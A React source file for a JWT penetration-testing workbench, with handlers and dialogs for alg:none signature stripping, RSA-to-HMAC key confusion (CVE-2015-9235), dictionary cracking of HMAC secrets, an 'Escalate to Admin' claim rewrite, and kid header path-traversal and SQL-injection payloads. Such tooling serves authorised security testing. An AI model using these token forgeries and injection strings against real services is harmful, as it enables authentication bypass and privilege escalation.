import React, { useState } from 'react';
import { useToastStore } from '../stores/toastStore';
import { Button } from '../design-system/Button';
import {
  KeyRound,
  ShieldAlert,
  Zap,
  Copy,
  RefreshCw,
  Sliders,
  CheckCircle2,
  XCircle,
  Lock,
  AlertTriangle,
} from 'lucide-react';
import {
  signHmac,
  verifyHmacJwt,
  generateAlgNoneTokens,
  generateKeyConfusionToken,
  generateKidInjectionTokens,
  dictionaryCrackHmac,
  base64UrlEncode,
  base64UrlDecode,
  HmacAlgorithm,
} from '../utils/jwtCryptoUtils';

export const JwtWorkspaceView: React.FC = () => {
  const { addToast } = useToastStore();

  const [rawToken, setRawToken] = useState(
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJyb2xlIjoidXNlciIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxNzg3MDU4NDQxfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'
  );

  const [headerJson, setHeaderJson] = useState('{\n  "alg": "HS256",\n  "typ": "JWT"\n}');
  const [payloadJson, setPayloadJson] = useState('{\n  "sub": "1234567890",\n  "name": "Admin User",\n  "role": "user",\n  "iat": 1516239022,\n  "exp": 1787058441\n}');
  const [secretKey, setSecretKey] = useState('your-256-bit-secret');
  const [publicKeyPem, setPublicKeyPem] = useState(
    '-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu1SU1LfVLPHCozVcK2Ey\n-----END PUBLIC KEY-----'
  );
  const [showKeyConfusionModal, setShowKeyConfusionModal] = useState(false);
  const [showCrackerModal, setShowCrackerModal] = useState(false);
  const [crackerWordlist, setCrackerWordlist] = useState(
    'secret\npassword\n123456\nadmin\njwt_secret\nsupersecret\ndevelopment\nprivate\nkey\nchangeme\nyour-256-bit-secret'
  );
  const [isCracking, setIsCracking] = useState(false);
  const [crackedSecret, setCrackedSecret] = useState<string | null>(null);
  const [showKidModal, setShowKidModal] = useState(false);
  const [signatureStatus, setSignatureStatus] = useState<'VALID' | 'INVALID' | 'UNVERIFIED'>('UNVERIFIED');
  const [isVerifying, setIsVerifying] = useState(false);

  // Decode raw token on change
  const handleRawTokenChange = (token: string) => {
    setRawToken(token);
    setSignatureStatus('UNVERIFIED');
    try {
      const parts = token.trim().split('.');
      if (parts.length >= 2) {
        const decodedHeader = base64UrlDecode(parts[0]);
        const decodedPayload = base64UrlDecode(parts[1]);
        setHeaderJson(JSON.stringify(JSON.parse(decodedHeader), null, 2));
        setPayloadJson(JSON.stringify(JSON.parse(decodedPayload), null, 2));
      }
    } catch {
      // Ignored during partial typing
    }
  };

  // Cryptographically re-sign token using WebCrypto HMAC
  const handleReEncode = async () => {
    try {
      const parsedHeader = JSON.parse(headerJson);
      const parsedPayload = JSON.parse(payloadJson);
      const alg = (parsedHeader.alg || 'HS256').toUpperCase() as HmacAlgorithm;

      const encodedH = base64UrlEncode(JSON.stringify(parsedHeader));
      const encodedP = base64UrlEncode(JSON.stringify(parsedPayload));
      const unsigned = `${encodedH}.${encodedP}`;

      if (alg === ('NONE' as any) || alg === ('none' as any)) {
        setRawToken(`${unsigned}.`);
        setSignatureStatus('UNVERIFIED');
        addToast({ type: 'warning', title: 'JWT Generated without Signature (alg: none)' });
        return;
      }

      const signature = await signHmac(unsigned, secretKey, alg);
      setRawToken(`${unsigned}.${signature}`);
      setSignatureStatus('VALID');
      addToast({
        type: 'success',
        title: `JWT Cryptographically Signed (${alg})`,
        description: 'HMAC signature generated via WebCrypto API',
      });
    } catch (err: any) {
      addToast({ type: 'error', title: 'Signing Error', description: String(err?.message || err) });
    }
  };

  // Verify HMAC signature
  const handleVerifySignature = async () => {
    setIsVerifying(true);
    try {
      const result = await verifyHmacJwt(rawToken, secretKey);
      if (result.valid) {
        setSignatureStatus('VALID');
        addToast({ type: 'success', title: 'Signature Verified', description: 'Cryptographically valid HMAC signature matching secret key' });
      } else {
        setSignatureStatus('INVALID');
        addToast({ type: 'danger', title: 'Signature Invalid', description: result.error || 'Signature mismatch' });
      }
    } catch (err: any) {
      setSignatureStatus('INVALID');
      addToast({ type: 'danger', title: 'Verification Error', description: String(err?.message || err) });
    } finally {
      setIsVerifying(false);
    }
  };

  // Attack 1: Alg: None Attack
  const handleAlgNoneAttack = () => {
    try {
      const tokens = generateAlgNoneTokens(headerJson, payloadJson);
      const chosen = tokens[0];
      setRawToken(chosen.modifiedJwt);
      handleRawTokenChange(chosen.modifiedJwt);
      setSignatureStatus('UNVERIFIED');
      addToast({
        type: 'warning',
        title: 'Algorithm "none" Token Generated',
        description: 'Stripped signature segment for testing authentication bypass',
      });
    } catch (err: any) {
      addToast({ type: 'error', title: 'Payload Generation Error', description: String(err?.message || err) });
    }
  };

  // Attack 2: CVE-2015-9235 Key Confusion Attack
  const handleKeyConfusionAttack = async () => {
    try {
      const attack = await generateKeyConfusionToken(headerJson, payloadJson, publicKeyPem);
      setRawToken(attack.modifiedJwt);
      handleRawTokenChange(attack.modifiedJwt);
      setShowKeyConfusionModal(false);
      setSignatureStatus('VALID');
      addToast({
        type: 'warning',
        title: 'Key Confusion Token Created (CVE-2015-9235)',
        description: 'RS256 switched to HS256 signed with public key as HMAC secret',
      });
    } catch (err: any) {
      addToast({ type: 'error', title: 'Key Confusion Error', description: String(err?.message || err) });
    }
  };

  // Privilege escalation helper
  const handleEscalateAdmin = async () => {
    try {
      const payloadObj = JSON.parse(payloadJson);
      payloadObj.role = 'admin';
      payloadObj.isAdmin = true;
      payloadObj.admin = true;
      payloadObj.scope = 'admin:all read write delete';
      payloadObj.exp = Math.floor(Date.now() / 1000) + 86400 * 365; // +1 year
      const newPayloadStr = JSON.stringify(payloadObj, null, 2);
      setPayloadJson(newPayloadStr);

      const parsedHeader = JSON.parse(headerJson);
      const alg = (parsedHeader.alg || 'HS256').toUpperCase() as HmacAlgorithm;
      const unsigned = `${base64UrlEncode(JSON.stringify(parsedHeader))}.${base64UrlEncode(JSON.stringify(payloadObj))}`;
      const sig = await signHmac(unsigned, secretKey, alg);
      setRawToken(`${unsigned}.${sig}`);
      setSignatureStatus('VALID');
      addToast({ type: 'success', title: 'Role Escalated & Re-Signed', description: 'Added admin: true & re-signed token' });
    } catch (err: any) {
      addToast({ type: 'error', title: 'Escalation Error', description: String(err?.message || err) });
    }
  };

  const handleStartCrack = async () => {
    setIsCracking(true);
    setCrackedSecret(null);
    const list = crackerWordlist.split('\n').map((s) => s.trim()).filter(Boolean);
    const start = performance.now();
    try {
      const secret = await dictionaryCrackHmac(rawToken, list);
      const elapsed = Math.round(performance.now() - start);
      if (secret) {
        setCrackedSecret(secret);
        setSecretKey(secret);
        setSignatureStatus('VALID');
        addToast({
          type: 'success',
          title: 'HMAC Secret Successfully Cracked!',
          description: `Found secret: "${secret}" in ${list.length} candidates (${elapsed}ms)`,
        });
      } else {
        addToast({
          type: 'warning',
          title: 'Dictionary Exhausted',
          description: `Tested ${list.length} candidates in ${elapsed}ms. Secret not found in wordlist.`,
        });
      }
    } catch (err: any) {
      addToast({ type: 'error', title: 'Cracker Error', description: String(err?.message || err) });
    } finally {
      setIsCracking(false);
    }
  };

  const handleApplyKidInjection = async (attackType: 'traversal' | 'sqli') => {
    try {
      const tokens = await generateKidInjectionTokens(headerJson, payloadJson);
      const chosen = attackType === 'traversal' ? tokens[0] : tokens[1];
      if (chosen) {
        setRawToken(chosen.modifiedJwt);
        handleRawTokenChange(chosen.modifiedJwt);
        setShowKidModal(false);
        addToast({
          type: 'warning',
          title: `Key ID (kid) ${attackType === 'traversal' ? 'Path Traversal' : 'SQL Injection'} Applied`,
          description: chosen.explanation,
        });
      }
    } catch (err: any) {
      addToast({ type: 'error', title: 'kid Injection Error', description: String(err?.message || err) });
    }
  };

  return (
    <div className="flex flex-col w-full h-full bg-[#1e1f22] text-[#dfdfdf] font-sans select-none overflow-hidden text-xs">
      {/* 1. Header Toolbar */}
      <div className="h-9 bg-[#2b2d30] border-b border-[#1e1f22] flex items-center justify-between px-3 flex-shrink-0">
        <div className="flex items-center gap-2">
          <KeyRound className="w-4 h-4 text-[#f37021]" />
          <span className="font-bold text-white text-xs">JSON Web Tokens (JWT) Pentest & WebCrypto Workbench</span>
          <span className="bg-[#141517] text-[#34d399] border border-[#3e4249] px-2 py-0.5 rounded text-[10px] font-mono">
            RFC 7519 / WebCrypto HMAC-SHA
          </span>
        </div>

        {/* Attack Actions */}
        <div className="flex items-center gap-1.5">
          <Button
            variant="secondary"
            size="xs"
            leftIcon={<KeyRound className="w-3 h-3 text-[#34d399]" />}
            onClick={() => setShowCrackerModal(true)}
            title="Dictionary brute-force HMAC secret using WebCrypto"
            className="border-emerald-600/40 text-emerald-300 hover:bg-emerald-950/40 font-bold"
          >
            🔑 Crack Secret (HMAC)
          </Button>
          <Button
            variant="secondary"
            size="xs"
            leftIcon={<AlertTriangle className="w-3 h-3 text-[#f43f5e]" />}
            onClick={() => setShowKidModal(true)}
            title="Key ID (kid) Header Injection Attacks (Traversal / SQLi)"
            className="border-rose-600/40 text-rose-300 hover:bg-rose-950/40 font-bold"
          >
            🎯 kid Injections
          </Button>
          <Button
            variant="secondary"
            size="xs"
            leftIcon={<Zap className="w-3 h-3 text-[#f37021]" />}
            onClick={handleAlgNoneAttack}
            title="Perform 'alg: none' signature stripping bypass"
          >
            Alg: None
          </Button>
          <Button
            variant="secondary"
            size="xs"
            leftIcon={<ShieldAlert className="w-3 h-3 text-[#eab308]" />}
            onClick={() => setShowKeyConfusionModal(true)}
            title="CVE-2015-9235 RSA-to-HMAC Key Confusion"
          >
            Key Confusion
          </Button>
          <Button
            variant="secondary"
            size="xs"
            leftIcon={<Sliders className="w-3 h-3 text-[#38bdf8]" />}
            onClick={handleEscalateAdmin}
            title="Elevate role claims and refresh expiration"
          >
            Escalate to Admin
          </Button>
          <Button
            variant="primary"
            size="xs"
            leftIcon={<RefreshCw className={`w-3 h-3 ${isVerifying ? 'animate-spin' : ''}`} />}
            onClick={handleVerifySignature}
            className="bg-[#2b2d30] hover:bg-[#3e4249] text-white border border-[#3e4249]"
          >
            Verify Signature
          </Button>
          <Button
            variant="primary"
            size="xs"
            leftIcon={<Lock className="w-3 h-3" />}
            onClick={handleReEncode}
            className="bg-[#f37021] hover:bg-[#e05d06] text-white font-bold"
          >
            Re-Sign Token
          </Button>
        </div>
      </div>

      {/* 2. Top: Raw Token & Signature Status Bar */}
      <div className="p-3 bg-[#141517] border-b border-[#2b2d30] flex flex-col gap-2">
        <div className="flex items-center justify-between">
          <span className="font-semibold text-white text-xs flex items-center gap-2">
            <span>Raw Encoded JWT (Token Buffer)</span>
            {signatureStatus === 'VALID' ? (
              <span className="bg-[#34d399]/20 text-[#34d399] border border-[#34d399]/40 px-2 py-0.5 rounded text-[10px] font-bold flex items-center gap-1">
                <CheckCircle2 className="w-3 h-3" /> Valid Signature
              </span>
            ) : signatureStatus === 'INVALID' ? (
              <span className="bg-[#ef4444]/20 text-[#ef4444] border border-[#ef4444]/40 px-2 py-0.5 rounded text-[10px] font-bold flex items-center gap-1">
                <XCircle className="w-3 h-3" /> Invalid Signature
              </span>
            ) : (
              <span className="bg-[#9da5b4]/20 text-[#9da5b4] border border-[#9da5b4]/40 px-2 py-0.5 rounded text-[10px] font-bold flex items-center gap-1">
                <AlertTriangle className="w-3 h-3" /> Unverified
              </span>
            )}
          </span>

          <div className="flex items-center gap-2">
            <span className="text-[#9da5b4] font-mono text-[11px]">HMAC Secret:</span>
            <input
              type="text"
              value={secretKey}
              onChange={(e) => setSecretKey(e.target.value)}
              className="bg-[#1e1f22] text-white font-mono text-xs px-2 py-0.5 rounded border border-[#3e4249] w-48 focus:outline-none"
              placeholder="Secret / Key"
            />
            <button
              onClick={() => {
                navigator.clipboard.writeText(rawToken);
                addToast({ type: 'info', title: 'Copied JWT to clipboard' });
              }}
              className="p-1 hover:bg-[#2b2d30] rounded text-[#9da5b4] hover:text-white"
            >
              <Copy className="w-3.5 h-3.5" />
            </button>
          </div>
        </div>

        <textarea
          value={rawToken}
          onChange={(e) => handleRawTokenChange(e.target.value)}
          rows={2}
          className="w-full bg-[#1e1f22] text-white font-mono text-xs p-2 rounded border border-[#3e4249] focus:outline-none focus:border-[#f37021] resize-none"
        />
      </div>

      {/* 3. Split Editor: Header vs Payload */}
      <div className="flex-1 flex min-h-0 overflow-hidden">
        {/* Left: Header Editor */}
        <div className="w-1/2 flex flex-col border-r border-[#2b2d30] bg-[#18191c] p-3">
          <div className="flex items-center justify-between pb-2 text-xs font-semibold text-[#ef4444]">
            <span>Header (JOSE Decoded)</span>
            <span className="text-[10px] text-[#9da5b4] font-mono">Algorithm & Token Type</span>
          </div>
          <textarea
            value={headerJson}
            onChange={(e) => setHeaderJson(e.target.value)}
            className="flex-1 w-full bg-[#141517] text-[#ef4444] font-mono text-xs p-3 rounded border border-[#3e4249] focus:outline-none focus:border-[#ef4444] resize-none leading-relaxed"
          />
        </div>

        {/* Right: Payload Editor */}
        <div className="w-1/2 flex flex-col bg-[#18191c] p-3">
          <div className="flex items-center justify-between pb-2 text-xs font-semibold text-[#a855f7]">
            <span>Payload Claims (Data & Scope)</span>
            <span className="text-[10px] text-[#9da5b4] font-mono">Identity & Role Claims</span>
          </div>
          <textarea
            value={payloadJson}
            onChange={(e) => setPayloadJson(e.target.value)}
            className="flex-1 w-full bg-[#141517] text-[#a855f7] font-mono text-xs p-3 rounded border border-[#3e4249] focus:outline-none focus:border-[#a855f7] resize-none leading-relaxed"
          />
        </div>
      </div>

      {/* Key Confusion Modal */}
      {showKeyConfusionModal && (
        <div className="fixed inset-0 bg-black/60 z-50 flex items-center justify-center p-4">
          <div className="bg-[#1e1f22] border border-[#3e4249] rounded-lg p-4 w-full max-w-lg space-y-3">
            <div className="flex items-center justify-between border-b border-[#3e4249] pb-2">
              <span className="font-bold text-white text-xs flex items-center gap-2">
                <ShieldAlert className="w-4 h-4 text-[#eab308]" />
                CVE-2015-9235 RSA-to-HMAC Key Confusion Setup
              </span>
              <button onClick={() => setShowKeyConfusionModal(false)} className="text-[#9da5b4] hover:text-white">✕</button>
            </div>
            <p className="text-[11px] text-[#9da5b4]">
              Supply target server's public RSA key. Sentinel will re-encode the token using algorithm <code className="text-[#f37021]">HS256</code> and sign it with this public key string as the HMAC secret.
            </p>
            <textarea
              value={publicKeyPem}
              onChange={(e) => setPublicKeyPem(e.target.value)}
              rows={5}
              className="w-full bg-[#141517] text-white font-mono text-xs p-2 rounded border border-[#3e4249] focus:outline-none"
              placeholder="Paste public key PEM..."
            />
            <div className="flex justify-end gap-2 pt-2">
              <Button variant="secondary" size="xs" onClick={() => setShowKeyConfusionModal(false)}>
                Cancel
              </Button>
              <Button variant="primary" size="xs" onClick={handleKeyConfusionAttack} className="bg-[#f37021] text-white font-bold">
                Generate Exploit Token
              </Button>
            </div>
          </div>
        </div>
      )}

      {/* Dictionary Cracker Modal */}
      {showCrackerModal && (
        <div className="fixed inset-0 bg-black/60 z-50 flex items-center justify-center p-4">
          <div className="bg-[#1e1f22] border border-emerald-500/40 rounded-lg p-4 w-full max-w-lg space-y-3 shadow-2xl">
            <div className="flex items-center justify-between border-b border-[#3e4249] pb-2">
              <span className="font-bold text-white text-xs flex items-center gap-2">
                <KeyRound className="w-4 h-4 text-emerald-400" />
                WebCrypto High-Performance HMAC Secret Dictionary Cracker
              </span>
              <button onClick={() => setShowCrackerModal(false)} className="text-[#9da5b4] hover:text-white">✕</button>
            </div>
            <p className="text-[11px] text-[#9da5b4]">
              High-speed asynchronous WebCrypto SHA-256 HMAC dictionary attack (RFC 7515). Enter candidate secrets (one per line):
            </p>
            <textarea
              value={crackerWordlist}
              onChange={(e) => setCrackerWordlist(e.target.value)}
              rows={6}
              className="w-full bg-[#141517] text-emerald-300 font-mono text-xs p-2 rounded border border-[#3e4249] focus:outline-none focus:border-emerald-500"
              placeholder="Enter secret wordlist..."
            />
            {crackedSecret && (
              <div className="p-2.5 rounded bg-emerald-950/60 border border-emerald-500/40 flex items-center justify-between">
                <div>
                  <span className="text-[10px] text-emerald-400 font-bold block">CRACKED SECRET FOUND:</span>
                  <code className="text-white font-mono font-bold text-xs">{crackedSecret}</code>
                </div>
                <Button
                  variant="primary"
                  size="xs"
                  onClick={() => {
                    setSecretKey(crackedSecret);
                    setShowCrackerModal(false);
                  }}
                  className="bg-emerald-600 hover:bg-emerald-500 text-white font-bold"
                >
                  Use Secret in Workspace
                </Button>
              </div>
            )}
            <div className="flex justify-end gap-2 pt-2">
              <Button variant="secondary" size="xs" onClick={() => setShowCrackerModal(false)}>
                Close
              </Button>
              <Button
                variant="primary"
                size="xs"
                onClick={handleStartCrack}
                disabled={isCracking}
                className="bg-emerald-600 hover:bg-emerald-500 text-white font-bold flex items-center gap-1.5"
              >
                <RefreshCw className={`w-3 h-3 ${isCracking ? 'animate-spin' : ''}`} />
                {isCracking ? 'Testing Candidates...' : 'Start Cracking Attack'}
              </Button>
            </div>
          </div>
        </div>
      )}

      {/* Key ID (kid) Injection Modal */}
      {showKidModal && (
        <div className="fixed inset-0 bg-black/60 z-50 flex items-center justify-center p-4">
          <div className="bg-[#1e1f22] border border-rose-500/40 rounded-lg p-4 w-full max-w-lg space-y-3 shadow-2xl">
            <div className="flex items-center justify-between border-b border-[#3e4249] pb-2">
              <span className="font-bold text-white text-xs flex items-center gap-2">
                <AlertTriangle className="w-4 h-4 text-rose-400" />
                Key ID (kid) Header Injection Exploitation Suite
              </span>
              <button onClick={() => setShowKidModal(false)} className="text-[#9da5b4] hover:text-white">✕</button>
            </div>
            <p className="text-[11px] text-[#9da5b4]">
              When backends resolve verification keys from filesystem paths or database lookups using the <code className="text-rose-400">kid</code> header without sanitization, malicious keys can force predictable secret resolution:
            </p>
            <div className="space-y-2">
              <div className="p-3 rounded bg-[#141517] border border-[#3e4249] flex items-center justify-between">
                <div>
                  <div className="font-bold text-white text-xs font-mono">1. Path Traversal (/dev/null Empty Key)</div>
                  <div className="text-[10px] text-[#9da5b4] font-mono">kid: &quot;../../../../../../dev/null&quot; &middot; Signs with empty string secret &quot;&quot;</div>
                </div>
                <Button
                  variant="secondary"
                  size="xs"
                  onClick={() => handleApplyKidInjection('traversal')}
                  className="bg-rose-950/60 border-rose-500/40 text-rose-300 hover:bg-rose-900 font-bold"
                >
                  Apply Traversal
                </Button>
              </div>

              <div className="p-3 rounded bg-[#141517] border border-[#3e4249] flex items-center justify-between">
                <div>
                  <div className="font-bold text-white text-xs font-mono">2. SQL Injection (DB Key Lookup Spoofing)</div>
                  <div className="text-[10px] text-[#9da5b4] font-mono">kid: &quot;key1&apos; UNION SELECT &apos;stnl_spoofed_secret&apos;--&quot; &middot; Predictable secret injection</div>
                </div>
                <Button
                  variant="secondary"
                  size="xs"
                  onClick={() => handleApplyKidInjection('sqli')}
                  className="bg-rose-950/60 border-rose-500/40 text-rose-300 hover:bg-rose-900 font-bold"
                >
                  Apply SQLi
                </Button>
              </div>
            </div>
            <div className="flex justify-end pt-2">
              <Button variant="secondary" size="xs" onClick={() => setShowKidModal(false)}>
                Close
              </Button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
